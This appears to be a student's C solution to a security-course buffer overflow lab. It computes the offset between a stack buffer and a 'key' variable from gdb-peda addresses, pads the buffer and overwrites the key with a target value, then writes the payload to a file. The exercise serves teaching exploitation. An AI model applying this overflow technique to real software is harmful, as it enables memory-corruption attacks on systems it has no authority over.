#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    /*
    gdb-peda$ p &buf
    $1 = (char (*)[37]) 0xffffd087
    gdb-peda$ p &key
    $2 = (int *) 0xffffd0b4
    */
    long offset = (long)0xffffd0b4 - (long)0xffffd087;
    printf("Offset between buf and key: %ld\n", offset);
    // Defining payload size: +4 to overwrite key
    int attack_buffer_size = offset + 4; 
    char attack_buffer[attack_buffer_size + 1];
    memset(attack_buffer, '*', attack_buffer_size); 
    *(int*)(attack_buffer + offset) = V1_TARGET;
    write_to_file( "payloads/attack1-payload", attack_buffer, attack_buffer_size + 1, FILE_CLEAR );
    exit(0);
}